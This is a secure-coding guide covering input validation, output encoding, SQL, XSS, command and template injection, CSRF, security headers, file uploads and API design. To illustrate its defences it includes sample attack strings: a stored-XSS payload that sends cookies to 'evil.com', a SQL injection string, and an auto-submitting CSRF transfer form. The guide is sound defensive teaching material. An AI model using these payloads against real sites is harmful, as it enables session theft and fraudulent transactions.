# Secure Coding

A comprehensive guide to secure coding practices — covering input validation, output encoding, injection prevention, secure defaults, error handling, file upload security, and defensive programming patterns for modern applications.

---

## Table of Contents

1. [Overview](#overview)
   - [Target Audience](#target-audience)
   - [Scope](#scope)
2. [Input Validation](#input-validation)
   - [Validation Principles](#validation-principles)
   - [Allowlists vs Denylists](#allowlists-vs-denylists)
   - [Validation by Data Type](#validation-by-data-type)
   - [Server-Side vs Client-Side Validation](#server-side-vs-client-side-validation)
3. [Output Encoding](#output-encoding)
   - [Context-Aware Encoding](#context-aware-encoding)
   - [HTML Encoding](#html-encoding)
   - [JavaScript Encoding](#javascript-encoding)
   - [URL Encoding](#url-encoding)
4. [Injection Prevention](#injection-prevention)
   - [SQL Injection](#sql-injection)
   - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
   - [Command Injection](#command-injection)
   - [LDAP Injection](#ldap-injection)
   - [Template Injection](#template-injection)
5. [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
   - [How CSRF Works](#how-csrf-works)
   - [CSRF Prevention](#csrf-prevention)
6. [Secure Defaults](#secure-defaults)
   - [Default-Deny](#default-deny)
   - [Secure Configuration](#secure-configuration)
   - [Security Headers](#security-headers)
7. [Error Handling and Logging](#error-handling-and-logging)
   - [Secure Error Handling](#secure-error-handling)
   - [Security Logging](#security-logging)
   - [What Not to Log](#what-not-to-log)
8. [File Upload Security](#file-upload-security)
   - [File Upload Risks](#file-upload-risks)
   - [File Upload Controls](#file-upload-controls)
9. [Secure Deserialization](#secure-deserialization)
10. [Secure API Design](#secure-api-design)
    - [API Input Validation](#api-input-validation)
    - [Rate Limiting](#rate-limiting)
    - [API Versioning and Deprecation](#api-versioning-and-deprecation)
11. [Dependency Security](#dependency-security)
12. [Next Steps](#next-steps)
13. [Version History](#version-history)

---

## Overview

Secure coding is the practice of writing code that is resistant to security vulnerabilities. Every line of code that processes user input, accesses data, or communicates across a network is a potential attack vector. Secure coding is not about adding security after the fact — it is about writing code that is secure by default, rejecting invalid input, encoding output, and failing safely.

This document covers the practical secure coding techniques that every developer should know: input validation, output encoding, injection prevention, CSRF protection, secure defaults, error handling, and secure API design.

### Target Audience

- **Developers** writing application code in any language or framework
- **Code Reviewers** evaluating pull requests for security issues
- **Security Engineers** building secure coding guidelines and training programs
- **Tech Leads** establishing secure coding standards for teams

### Scope

- Input validation: principles, allowlists, data type validation
- Output encoding: context-aware encoding for HTML, JavaScript, URLs
- Injection prevention: SQL, XSS, command, LDAP, template injection
- CSRF prevention: tokens, SameSite cookies, origin validation
- Secure defaults: default-deny, security headers, secure configuration
- Error handling: secure error messages, security logging
- File upload security and secure deserialization
- Secure API design: input validation, rate limiting
- Dependency security practices

---

## Input Validation

### Validation Principles

All input from external sources is untrusted and must be validated before processing. "External sources" includes:

- User form submissions
- URL parameters and query strings
- HTTP headers and cookies
- File uploads
- API request bodies
- Database reads (if the data was originally user-supplied)
- Messages from queues
- Data from third-party APIs

```
Input Validation Rules
──────────────────────
1. Validate on the server — client-side validation is for UX, not security
2. Validate type, length, range, and format
3. Use allowlists (define what IS valid) not denylists (define what is NOT valid)
4. Reject invalid input — do not try to sanitize and accept it
5. Validate early — check input at the entry point before any processing
6. Validate at every trust boundary — do not assume prior validation
```

### Allowlists vs Denylists

| Approach | Description | Security |
|----------|-------------|----------|
| **Allowlist** (preferred) | Define exactly what IS valid; reject everything else | ✅ Strong — new attack patterns are rejected by default |
| **Denylist** (avoid) | Define what is NOT valid; accept everything else | ❌ Weak — new attack patterns bypass the list |

```
Allowlist Example (email):
  - Must match regex: ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$
  - Maximum length: 254 characters
  - Must not contain null bytes

Denylist Example (DON'T DO THIS):
  - Block inputs containing "<script>"  ← easily bypassed with <ScRiPt>, %3Cscript%3E, etc.
```

### Validation by Data Type

| Data Type | Validation Rules |
|-----------|-----------------|
| **Strings** | Max length, character allowlist, encoding (UTF-8), no null bytes |
| **Numbers** | Type (integer/float), range (min/max), no leading zeros |
| **Emails** | Regex pattern, max length 254, verify via confirmation email |
| **URLs** | Scheme allowlist (https), hostname allowlist, no data: or javascript: |
| **Dates** | ISO 8601 format, valid range, timezone handling |
| **File names** | No path traversal (../, ..\), allowlisted extensions, max length |
| **UUIDs** | Exact format validation (8-4-4-4-12 hex pattern) |
| **JSON** | Schema validation, max depth, max size |

### Server-Side vs Client-Side Validation

| Aspect | Client-Side | Server-Side |
|--------|-------------|-------------|
| **Purpose** | User experience (immediate feedback) | Security (authoritative validation) |
| **Bypassable?** | Yes — trivially | No — runs on your server |
| **Required?** | Optional (UX improvement) | **Mandatory** |
| **Language** | JavaScript | Your server language |

**Rule:** Client-side validation is a convenience for users. Server-side validation is a requirement for security. Always validate on the server, even if you also validate on the client.

---

## Output Encoding

### Context-Aware Encoding

Output encoding prevents injection attacks by ensuring that user-supplied data is treated as data, not as code. The encoding must match the context where the data is rendered:

```
Context-Aware Encoding
──────────────────────
Context                 Encoding Required
───────────────────     ─────────────────────────────────
HTML body               HTML entity encoding (& < > " ')
HTML attribute          HTML attribute encoding
JavaScript string       JavaScript escaping (\x, \u)
URL parameter           URL/percent encoding (%xx)
CSS value               CSS hex encoding
JSON value              JSON string escaping
SQL query               Parameterized queries (NOT encoding)
```

### HTML Encoding

Encode the following characters when inserting untrusted data into HTML:

| Character | Encoded | Context |
|-----------|---------|---------|
| `&` | `&amp;` | Prevents entity interpretation |
| `<` | `&lt;` | Prevents tag injection |
| `>` | `&gt;` | Prevents tag injection |
| `"` | `&quot;` | Prevents attribute breakout |
| `'` | `&#x27;` | Prevents attribute breakout |

### JavaScript Encoding

When inserting untrusted data into JavaScript strings, encode non-alphanumeric characters using `\xHH` or `\uHHHH` notation. Better yet, avoid inserting untrusted data into JavaScript contexts entirely — use data attributes and read them from the DOM.

### URL Encoding

When inserting untrusted data into URL parameters, use percent encoding (`%HH`). Validate the URL scheme (allow only `https://`) and hostname before using a user-supplied URL for redirects or server-side requests.

---

## Injection Prevention

### SQL Injection

**SQL injection** occurs when user input is concatenated directly into SQL queries, allowing an attacker to modify the query logic.

```
SQL Injection Example
─────────────────────
Vulnerable code:
  query = "SELECT * FROM users WHERE name = '" + username + "'"
  # If username = "' OR '1'='1"
  # Query becomes: SELECT * FROM users WHERE name = '' OR '1'='1'
  # Returns ALL users

Secure code (parameterized query):
  query = "SELECT * FROM users WHERE name = ?"
  db.execute(query, [username])
  # The database treats username as a data value, not as SQL code
```

**Prevention:**

- Always use parameterized queries (prepared statements) for all database access
- Use an ORM with parameterized query support (Entity Framework, Hibernate, SQLAlchemy)
- Never concatenate user input into SQL strings
- Apply least privilege to database accounts (read-only where writes are not needed)
- Validate and sanitize input as an additional layer (defense in depth)

### Cross-Site Scripting (XSS)

**XSS** allows an attacker to inject malicious scripts into web pages viewed by other users.

| Type | Description | Example |
|------|-------------|---------|
| **Reflected** | Script injected via URL parameter, reflected back in the response | `https://example.com/search?q=<script>alert(1)</script>` |
| **Stored** | Script stored in the database and rendered on every page view | Comment containing `<img onerror="fetch('https://evil.com/steal?c='+document.cookie)">` |
| **DOM-based** | Script injected via client-side JavaScript that modifies the DOM | `document.innerHTML = location.hash.slice(1)` |

**Prevention:**

- Encode all output using context-aware encoding (HTML, JavaScript, URL, CSS)
- Use Content Security Policy (CSP) headers to restrict script sources
- Use modern frameworks (React, Angular, Vue) that auto-escape output by default
- Avoid `innerHTML`, `document.write()`, and `eval()`
- Sanitize HTML where rich text is needed (use a library like DOMPurify)

### Command Injection

**Command injection** occurs when user input is passed to system shell commands.

**Prevention:**

- Avoid calling OS commands from application code entirely
- If OS commands are unavoidable, use parameterized APIs (not shell strings)
- Use allowlists for any arguments passed to commands
- Never use `system()`, `exec()`, or backtick execution with user input
- Run processes with least-privilege OS user accounts

### LDAP Injection

**Prevention:**

- Use LDAP libraries that support parameterized queries
- Escape special LDAP characters in user input
- Validate input against expected patterns (username, email)

### Template Injection

**Server-Side Template Injection (SSTI)** occurs when user input is processed as a template expression, allowing code execution.

**Prevention:**

- Never pass user input directly into template rendering
- Use logic-less templates or sandboxed template engines
- Validate and encode user input before template rendering

---

## Cross-Site Request Forgery (CSRF)

### How CSRF Works

CSRF exploits the browser's automatic inclusion of cookies in cross-origin requests:

```
CSRF Attack Flow
────────────────
1. User is logged in to bank.com (session cookie set)
2. User visits evil.com
3. evil.com contains: <form action="https://bank.com/transfer" method="POST">
                        <input name="to" value="attacker">
                        <input name="amount" value="10000">
                      </form>
                      <script>document.forms[0].submit()</script>
4. Browser sends the form to bank.com WITH the user's session cookie
5. bank.com processes the request as if the user initiated it
```

### CSRF Prevention

| Control | Description |
|---------|-------------|
| **SameSite cookies** | Set `SameSite=Lax` (default in modern browsers) or `SameSite=Strict` |
| **CSRF tokens** | Include a unique, unpredictable token in every state-changing request |
| **Origin header validation** | Verify the `Origin` or `Referer` header matches your domain |
| **Custom request headers** | Require a custom header (e.g., `X-Requested-With`) that cannot be set in cross-origin requests |

---

## Secure Defaults

### Default-Deny

Design systems so that the default behavior is the secure behavior:

- New API endpoints require authentication by default
- New user accounts have zero permissions until roles are explicitly assigned
- Firewall rules deny all traffic by default
- New features are disabled by default until explicitly enabled
- Error messages reveal no internal details by default

### Secure Configuration

- Disable debug mode, verbose errors, and development features in production
- Remove default accounts, sample data, and unnecessary endpoints
- Use production-specific configuration that has been reviewed for security
- Automate configuration management to prevent drift
- Validate configuration files against a security schema

### Security Headers

Apply these HTTP security headers to all responses:

| Header | Value | Purpose |
|--------|-------|---------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Force HTTPS for all requests |
| `Content-Security-Policy` | Application-specific policy | Prevent XSS, control resource loading |
| `X-Content-Type-Options` | `nosniff` | Prevent MIME type sniffing |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Prevent clickjacking |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Control referrer information leakage |
| `Permissions-Policy` | Application-specific | Restrict browser features (camera, mic, geolocation) |

---

## Error Handling and Logging

### Secure Error Handling

- **Never expose internal details** — Do not reveal stack traces, SQL queries, file paths, or server versions in error responses
- **Use generic error messages** — "An error occurred" for users; detailed errors in server-side logs only
- **Consistent error format** — Return structured error responses (JSON with error code, message) without internal details
- **Fail closed** — If a security control fails (authorization check, input validation), deny the request

### Security Logging

Log security-relevant events for monitoring and incident response:

- Authentication events (login success, failure, lockout)
- Authorization failures (access denied)
- Input validation failures
- Privilege changes (role assignment, permission modification)
- Data access to sensitive resources
- Configuration changes

### What Not to Log

Never include the following in log messages:

- Passwords or password hashes
- Session tokens or API keys
- Credit card numbers or bank account details
- Social Security numbers or national IDs
- Health information
- Full contents of encrypted data

---

## File Upload Security

### File Upload Risks

- **Malware** — Uploaded files may contain viruses, trojans, or ransomware
- **Web shells** — Attacker uploads a script (PHP, JSP) that provides remote command execution
- **Path traversal** — Manipulated filenames can write to arbitrary locations
- **Denial of service** — Extremely large files can exhaust disk space or processing resources
- **Content spoofing** — Files with misleading extensions (malware.pdf.exe)

### File Upload Controls

| Control | Implementation |
|---------|---------------|
| **File type validation** | Validate MIME type AND file extension against an allowlist; validate file magic bytes |
| **File size limit** | Enforce maximum file size at both the application and infrastructure level |
| **Filename sanitization** | Generate a new random filename; never use the user-supplied filename for storage |
| **Storage isolation** | Store uploaded files outside the web root; serve via a separate domain or CDN |
| **Antivirus scanning** | Scan uploaded files with antivirus before making them accessible |
| **Content-Disposition** | Serve downloaded files with `Content-Disposition: attachment` to prevent browser rendering |
| **Separate domain** | Serve user-uploaded content from a separate domain to prevent cookie theft |

---

## Secure Deserialization

Deserialization of untrusted data can lead to remote code execution, replay attacks, or injection.

**Prevention:**

- Do not deserialize data from untrusted sources
- If deserialization is necessary, use a safe format (JSON) with strict schema validation
- Validate and sanitize deserialized data before use
- Avoid language-native serialization formats (Java ObjectInputStream, Python pickle, PHP serialize) for untrusted input
- Implement integrity checks (HMAC) on serialized data

---

## Secure API Design

### API Input Validation

- Validate all request parameters, headers, and body fields on the server
- Use a schema validation library (JSON Schema, Zod, Joi, FluentValidation)
- Reject requests with unexpected fields (strict mode)
- Enforce maximum request body size
- Validate Content-Type headers

### Rate Limiting

Protect APIs from abuse with rate limiting:

```
Rate Limiting Strategy
──────────────────────
Global limit:     1000 requests/minute per API
Per-user limit:   100 requests/minute per user
Per-endpoint:     10 requests/minute for login (brute-force protection)
Per-IP:           50 requests/minute for unauthenticated endpoints

Return HTTP 429 with Retry-After header when limit is exceeded.
```

### API Versioning and Deprecation

- Version APIs to allow security fixes without breaking changes
- Deprecate insecure API versions with clear timelines
- Monitor usage of deprecated versions and communicate sunset dates
- Remove deprecated versions once migration is complete

---

## Dependency Security

- Keep dependencies up to date — use automated tools (Dependabot, Renovate)
- Pin dependency versions and use lock files
- Audit dependencies regularly (npm audit, pip-audit)
- Remove unused dependencies to reduce attack surface
- Review new dependencies before adding them (license, maintenance, security history)
- Prefer well-maintained, widely-used libraries over obscure alternatives

---

## Next Steps

Continue your security learning journey:

| File | Topic | Description |
|---|---|---|
| [00-OVERVIEW.md](00-OVERVIEW.md) | Security Fundamentals | CIA triad, threat modeling, OWASP Top 10 |
| [01-AUTHENTICATION.md](01-AUTHENTICATION.md) | Authentication | Password hashing, MFA, session management |
| [09-BEST-PRACTICES.md](09-BEST-PRACTICES.md) | Best Practices | Security checklists and automation |

---

## Version History

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | 2025 | Initial Secure Coding documentation |
